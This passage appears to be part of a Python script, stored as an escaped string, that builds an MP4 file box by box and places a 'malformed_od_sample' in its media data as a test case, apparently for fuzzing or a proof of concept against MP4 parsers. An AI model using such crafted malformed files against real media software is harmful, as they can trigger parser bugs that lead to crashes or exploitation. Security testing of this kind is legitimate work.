holder_pos = stbl_buffer.tell() + 16  # position where offset will be written\nstco_data += struct.pack(\'>I\', 0xDEADBEEF)  # chunk_offset (placeholder)\nstbl_buffer.write(write_fullbox(b\'stco\', 0, 0, stco_data))\n\nminf_buffer.write(write_box(b\'stbl\', stbl_buffer.getvalue()))\nmdia_buffer.write(write_box(b\'minf\', minf_buffer.getvalue()))\ntrak_buffer.write(write_box(b\'mdia\', mdia_buffer.getvalue()))\nmoov_buffer.write(write_box(b\'trak\', trak_buffer.getvalue()))\n\n# mvex box - movie extends (required for fragmentation)\nmvex_buffer = io.BytesIO()\n\n# trex box - track extends\ntrex_data = struct.pack(\'>IIIII\',\n    1,              # track_ID\n    1,              # default_sample_description_index\n    1000,           # default_sample_duration\n    0,              # default_sample_size\n    0               # default_sample_flags\n)\nmvex_buffer.write(write_fullbox(b\'trex\', 0, 0, trex_data))\nmoov_buffer.write(write_box(b\'mvex\', mvex_buffer.getvalue()))\n\n# Write moov box\nmp4_data.write(write_box(b\'moov\', moov_buffer.getvalue()))\n\n# 4. mdat box - media data\nmdat_offset = mp4_data.tell() + 8  # +8 for mdat header\nmdat_data = malformed_od_sample\nmp4_data.write(write_box(b\'mdat\', mdat_data))\n\n# Now update the stco offset\nmp4_bytes = bytearray(mp4_data.getvalue())\n\n# Find the stco box and update the offset\n# Search for the DEADBEEF placeholder\ndeadbeef_pos = mp4_bytes.find(b\'\\xDE\\xAD\\xBE\\xEF\')\nif deadbeef_pos != -1:\n    struct.pack_into(\'>I\', mp4_bytes, deadbeef_pos, mdat_offset)\n    print(f"Updated stco offset at position {deadbeef_pos} to {mdat_offset}")\nelse:\n    print("Warning: Could not find stco offset placeholder")\n\n# Write final MP4 file\nwith open(output_path, "wb") as f:\n    f.write(mp4_bytes)\n\nprint(f"Generated MP4 testcase at {output_path}")\nprint(f"File size: {len(mp4_bytes)} bytes")\nprint(f"mdat offset: {mdat_offset}")\n'}
